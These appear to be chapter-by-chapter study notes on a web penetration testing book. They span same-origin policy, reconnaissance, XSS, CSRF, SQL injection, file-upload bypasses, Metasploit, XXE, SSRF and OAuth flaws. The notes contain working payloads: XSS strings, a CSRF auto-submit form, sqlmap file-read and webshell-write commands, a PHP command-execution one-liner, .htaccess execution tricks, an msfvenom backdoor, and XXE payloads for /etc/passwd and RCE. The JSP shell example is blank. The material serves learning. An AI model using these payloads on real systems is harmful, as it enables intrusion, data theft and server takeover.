# Mastering Modern Web Penetration Testing (notes)
Prakhar Prasad

## Ch1 - Common Security Protocols

### SOP

- Suppose you have logged into your email account on one tab. On another tab you have opened up a malicious website.
- If the malicious website tries to exfiltrate data from your email account through some JavaScript code, it will fail because of **same origin policy**.
- Only a website with the same **origin** will be allowed to do that: *protocol, port number, and the hostname of the webpage*.
- SOP is not only for JS but for cookies, AJAX, Flash, and so on. Data stored inside localStorage is also governed by this policy.
- Example: `http://google.com/` and `http://www.google.com/` do not have the same origin since the hostname is different.
- Run this in your browser and take a look at the console.

```html
<iframe src="http://abhaynayar.com" name="demo"></iframe>
<script>
document.getElementsByName('demo')[0].onload = function() {
    try {
        console(frames[1].hostname)
    } catch(e) {
        console.log(e);
    }
}
</script>
```

### Switching origins

- Go to `google.com`
- In the console `document.domain = apple.com`
- **Can only switch origin if target page is a suffix of the current page.**
- So going from `images.google.com` to `google.com` will work. Not the reverse.
- Since `images.google.com` is not a suffix of `google.com` therefore it won't work.
- Also `google.com` to `com` won't work since it is a top-level domain.
- In chrome these protocols are allowed: `http, data, chrome, chrome-extension, https`

### CDM

- Cross-domain messaging.
- Introduced in HTML5, provides `postMessage()`

Sending
```js
receiver.postMessage('Hello','http://example.com')
```

Receiving
```js
window.addEventListener('message',function(event) {
if(event.origin != 'http://sender.com') return;
console.log('Received: ' + event.data,event);
},false);
```

### AJAX

- Allows exchanging data with the server without reloading the page. Works by using the XMLHTTPRequest() method of JS.
- But fetching or sending data to a server or URL which is at a different origin requires `Access-Control-Allow-Origin`

```html
<script>

var xhttp = new XMLHttpRequest();
xhttp.open("GET", "http://abhaynayar.com", true);
xhttp.send();

</script>
```

### CORS

- A page running at origin A can send/receive data from a server at origin B.
- Web fonts, CSS, documents, and so on are loaded from different origins.
- Most CDNs which provide resource-hosting functionality typically allow any website or origin to interact with themselves.
- CORS works by adding a new HTTP header that allows the web server to interact with a list of whitelisted domains.
- CORS is browser enforced, the browser looks into the response headers and acts accordingly.

CORS headers
- Access-Control-Allow-Origin: response header
- Access-Control-Allow-Methods: response header
- Origin: request header

Pre-flight request
- Custom HTTP headers are sent
- The body MIME-type is different than text/plain
- The HTTP method is different than GET or POST

## Ch2 - Information Gathering

Google dorks
- backup.sql intext:"SELECT" ext:sql site:net
- Google Hacking for Penetration Testers
```
ext:pdf site:abhaynayar.com
site:abhaynayar.com
inurl:/downloads site:abhaynayar.com
intitle:login site:abhaynayar.com
backup.sql intext:"SELECT" ext:sql
```

Generate wordlists
```
$ cewl abhaynayar.com
```
Cookies, country, headers.
```
$ whatweb abhaynayar.com
```

Computer search engine
```
https://www.shodan.io/search?query=Werkzeug
```

Reverse IP Lookup
```
https://www.yougetsignal.com/tools/web-sites-on-web-server/
```

## Ch3 - XSS

### Reflected

Check if these characters are permitted `"'<>();[]{}AbC`

XSS in href attribute
```
javascript:alert(1)
javascript://%0d%0aalert(1);
javascript://%0d%0aalert(1);//http://derp.com
javascript://%0d%0alert(1);//.com
```

Correct values for JSON responses are typically `text/javascript` or `application/json` if your value is being reflected and if you get `text/html` try for an XSS.

### Stored

Markdown
```
[Hi](javascript:alert(1);)
```
Spoofed IP address
- Use the `X-Forwarded-For` header (used by HTTP proxies)
- `X-Forwarded-For: "><img src=x onerror=alert(0);>`

### Resources
- http://html5sec.org
- https://www.blueclosure.com/
- https://code.google.com/archive/p/domxsswiki/wikis/Introduction.wiki

## Ch4 - CSRF

JSON

```
<body onload=document.getElementById('xsrf').submit()>
<form id="xsrf" action="transfer" method=post enctype="text/plain">
<input name='{"username":"Attacker","amount":2500,"padding":"' value='garbage"}' type='hidden'>
</form>
```

- Sometimes the CSRF tokens aren't validated, try sending a request without a token.
- Sometimes the CSRF tokens are not mapped to the user, try using another user's token.
- Sometimes the CSRF token's presence is required but the value can be left blank or random string of same length.
- Sometimes the CSRF tokens do not have sufficient randomness, try guessing them.

## Ch5 - SQLi

[sqlmap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

- technique: BEUSTQ
- dump:
    - `--current-user`
    - `--dbs`
    - `-D db_name --tables`
    - `-D db_name -T tbl_name --dump`
    - `-D db_name -T tbl_name --columns`
    - `-D db_name -T tbl_name --columns "col_name" --dump`
- `--wizard`
- `--dump-all`
- URL rewriting: uses \* as an injection point.
- Speeding up
    - `--threads 3`
    - `--null-connection`
    - `--keep-alive`
    - `--predict-output`
- Reading files
    - `--privileges`
    - `--file-read=/etc/passwd`
    - Ex. /var/www/config.inc , /var/www/html/config/config.inc.php
- Writing files
    - `--file-write=shell.php`
    - `--file-dest=/var/www/shell-php` 
    - PHP one-liner shell: `<?php system($_GET[1337]); ?>`
- POST requests
    - `-u URL --data="params" -p param_to_test`
    - Save the request and `sqlmap.py -r request.txt -p param_to_test`
- Cookies `--cookie="PHPSESSID=AAAAAAAAAAAAAAAAAAAAAAAA"`
- HTTP auth `--auth-cred and --auth-type`
- Database shell `--sql-shell`
- Command shell `--os-shell` or `--os-cmd "uname -a"`
- Tamper `--tamper charencode -v3`
- Proxy `--proxy="https://proxy.example.com:8080"`
- Tor `--tor`

# Ch6 - File upload

PHP functions used for os command execution
- system
- shell\_exec
- passthru
- backticks
- popen
- exec
- pcntl\_exec
- proc\_open

JSP shell
```
<%
                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
%>
```

Multi-functional webshells: https://github.com/b374k/b374k
```
$ php -f index.php -- -o shell.php -p PASSWORD
```

We can upload files such as HTML or SVG to get XSS.
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/
Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/
svg">
<script type="text/javascript">
alert("XSS: "+document.domain);
</script>
</svg>
```

Bypassing protections:
- Case sensitive blacklisting `pHp`
- MIME content type `text/php` to `image/gif`
- Bad extension checks: `.jpg.php`

Upload this as `.htacess` file. It executes
any file containing _php.gif as a valid PHP.
```
<FilesMatch "_php.gif">
SetHandler application/x-httpd-php
</FilesMatch>
```

If you upload this as `.htacess` then any file
with the extension `.lol` will execute as PHP.
```
AddType application/x-httpd-php .lol
```

## Ch7 - Metasploit and web

Metasploit modules
- Auxiliary: scanning, fuzzing
- Exploit: return a shell
- Encoder: cloak, obfuscate
- Payload: payload after exploit
- Others: Nops, post-exploitation

Metasploit for web
```
msf > use auxiliary/scanner/http/
msf > use auxiliary/scanner/http/brute_dirs
msf > use auxiliary/scanner/http/dir_scanner
msf > use auxiliary/scanner/http/files_dir
msf > show options
msf > set THREADS 10
msf > set RHOSTS VICTIM_IP
...
```

Automated scanner
```
msf > load wmap
msf > wmap_sites –a protocol://host:port
msf > wmap_sites –l
msf > wmap_targets –t protocol://host:port
msf > wmap_targets –l
msf > wmap_run –t
msf > wmap_run –e
```

Web backdoor
```
$ msfvenom -l payloads
$ msfvenom -p php/meterpreter/bind_tcp --list-options
$ msfvenom -p php/meterpreter/bind_tcp LPORT=60000 > /root/msf/php-msf.php
$ msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD php/meterpreter/bind_tcp
msf exploit(handler) > set RHOST VICTIM_IP
msf exploit(handler) > set LPORT 60000
```

If the session keeps ending, create a platform specific backdoor.

## Ch8 - XML attacks

XML Basics
- An XML document must contain only one root element.
- An attribute must always be quoted with either single quotes or double quotes.
- An XML DTD is document which is used to validate an XML document for certain criteria.
- An XML DTD can be internal or external. `<!DOCTYPE student SYSTEM "student.dtd">`

XML entities
- An XML entity is a representation of some information.
- A predefined entity is generally used to represent markup characters.
- We can define our own entities which will reference some information internally or externally.

Internal
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ELEMENT student (#PCDATA)>
	<!ENTITY name "James Jones">
]>
<student>&name;</student>
```

External
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ELEMENT student (#PCDATA)>
	<!ENTITY sname SYSTEM "https://abhaynayar.com/external.xml">
]>
<student>&sname;</student>
```

XXE attack

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
<!ENTITY oops SYSTEM "file:///etc/passwd">
]>
<student>
<name>&oops;</name>
</student>
```

- In some environments, it is possible to get a directory listing with the `file://` handler: `<!ENTITY oops SYSTEM "file:///etc/ ">`
- PHP base64 filter conversion
```
<!DOCTYPE student [
	<!ENTITY pwn SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<student>
<name>&pwn;</name>
</student>
```

SSRF through XXE

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ENTITY oops SYSTEM "http://scanme.nmap.org:20/">
]>
<student>
<name>&oops;</name>
</student>
```

RCE through XXE

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
	<!ENTITY rce SYSTEM "expect://id">
]>
<student>
<name>&rce;</name>
</student>
```

DoS through XXE

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ENTITY oops SYSTEM "file:///dev/random">
]>
<student>
<name>&oops;</name>
</student>
```

XML quadratic blowup

```
<?xml version="1.0"?>
<!DOCTYPE student [
<!ENTITY x "xxxxxxxxxxxxxxxxx..."> (50,000-100,000)
]>
<student>&x;&x;&x;&x;&x;&x;&x;&x;&x;...</student>
```

## Ch9 - Emerging attack vectors

### SSRF
https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit

- Port scanning: `http://scanme.nmap.org:1234/`
- `file://` to read files from the vulnerable server
- Protocol handlers:
	- SSH: `scp://`,`sftp://`
	- POP3
	- IMAP
	- SMTP
	- FTP
	- DICT
	- GOPHER
	- TFTP
	- JAR
	- LDAP

### IDOR

Read case studies and reports.

### DOM Clobbering

Run this code in your browser and take a look at the console.

```html
<!DOCTYPE html>
<html>
<head>
<title>DOM Clobbering 2</title>
</head>
<body>
<img src="https://prakharprasad.com/content/images/2014/12/1384127_10202574319665563_607846106_n-1.jpg" width="0px" height="0px" name="getElementsByTagName"/>
<script type="text/javascript">
    document.getElementsByTagName("body");
</script>
</body>
</html>
```

### Relative Path Overwrite

- If you have an import in `example.com/path/index.php` for relative path `style.css` your css will be loaded from `example.com/path/style.css`
- But due to server side language flexibility, even this URL acts like the first: `example.com/path/index.php/this/works`
- For that reason, the relative path now becomes `example.com/path/index.php/this/works/style.css` and will be ignored.
- We can find endpoints where we control the content of the document and inject code such as in search pages.

    - http://www.thespanner.co.uk/2014/03/21/rpo/

### UI redressing (clickjacking)

- This attack makes use of overlapping elements, transparent frames and social engineering.
- The attacker creates an iframe of one of the pages from the vulnerable web application.
- Just above the iframe there are some HTML elements that induce the user to perform actions on the iframe.

### PHP Object Injection

- User-supplied input getting passed to an `unserialize()`
- Magic functions `__construct()` `__destruct()` `__sleep()` `__wakeup()`

## Ch10 - OAuth 2.0 security

Read about it in RFC 6749.
```
resource owner ~> client application <~> server {resource, authorization}
```
| Component        | Description                                                                              |
|------------------|------------------------------------------------------------------------------------------|
| Redirect URI     | Determines the URI to redirect to once the flow is completed                             |
| Client ID        | Unique ID returned when the third party application is registered to the OAuth provider. |
| Client secret    | Secret token generated during the registration process and tied to the client ID.        |
| Receiving grants | There are two common authorization flows: authorization grant, implicit grant            |

Authorization grant

1. `prakharprasad.com` sends a request to `example.com/authorize`:`https://www.example.com/oauth/authorize?client_id=2190698099&redirect_uri= https%3A%2F%2Fprakharprasad.com%2Fredirect&response_type=code&scope=read`

```
- client_id
- redirect_uri
- response_type
- scope
```

2. After granting access through prompt you get redirected to `https://prakharprasad.com/redirect?code=af8SFAdas`
3. This callback url then makes another request to the `token` endpoint:`https://www.example.com/oauth/token?client_id=2190698099&client_secret=adb12hge&grant_type=authorization_code&code=af8SFAdas&redirect_uri=https%3A%2F%2Fprakharprasad.com%2Ftoken`

```
- client_id
- redirect_uri
- client_secret
- grant_type
- code
```

4. Then `example.com` returns the auth token to `prakharprasad.com` using the parameters sent in the request: `Access Token = Auth Code + Client ID + Client Secret + Redirect URI`
5. The auth flow ends here. now `prakharprasad.com` can send requests to `example.com` using `access_token` and get user's information.


Implicit grant

1. `prakharprasad.com` sends the following request to `example.com/authorize`:`https://www.example.com/oauth/authorize?client_id=2190698099&redirect_uri=https%3A%2F%2Fprakharprasad.com%2Ftoken&response_type=token&scope=read,write`
2. the user is prompted to grant access of their `example.com` resources to `prakharprasad.com`
3. the `example.com` server directly sends the `access_token` to `https://prakharprasad.com/token#access_token=EAACEdEose0cBAE3vD` instead of first using a code to send another request

OAuth exploitation

open redirect (malform scope or `client_id` and hijack `redirect_uri`)

hijack flow (can change `redirect_uri` to get `access_token` but if only `http://example.com/token/callback` is allowed)
- directory traversal (we can use the following urls if we can save files on `example.com`)
```
http://example.com/token/callback/../../our/path
http://example.com/token/callback/.%0a./.%0d./our/path
http://example.com/token/callback/%252e%252e/%252e%252e/our/path
/our/path///../../http://example.com/token/callback/
http://example.com/token/callback/%2e%2e/%2e%2e/our/path
```
- naked domain (subdomain not specified)
```
https://controlledsubdomain.example.com/token/callback
https://www1.example.com/token/callback
https://files.example.com/token/callback
```
- tld suffix confusion (.com is specified use .com.br)
- open redirect on client (Covert Redirect)

force a malicious app installation
- use clickjacking
- should not have `X-FRAME-OPTIONS` header

## Ch11 - API testing

- The REST API makes use of a URL's path to define relationship between resources.
- The resources are separated by a forward slash each time, based on the design hierarchy (top-down).
- HTTP methods have a specific meaning in the context of a REST API most of the time:

| Method  | Description            |
|---------|------------------------|
| GET     | resource state         |
| POST    | create new resource    |
| PUT     | update resource        |
| DELETE  | remove resource        |
| HEAD    | resource metadata      |
| OPTIONS | list available methods |

- HTTP response codes also have certain meanings in the context of REST API. Mostly same as those of HTTP.

Authentication types:
1. Basic HTTP `Authorization: Basic base64encode(usr:pwd)`
2. Access tokens
3. Cookies

REST API clients
1. Advanced REST client
2. Postman

Custom API explorers
1. Facebook's Graph API Explorer
2. Google's API Console
3. Dropbox's API Explorer

Things to do:
1. Read the docs
2. Make a lot of requests
3. Learn the scope
4. Learn roles
5. Read disclosed bugs

Methodology:
1. List endpoints
2. Trying different HTTP methods
3. Exploiting API bugs
    - Scope
    - Roles
    - IDORs
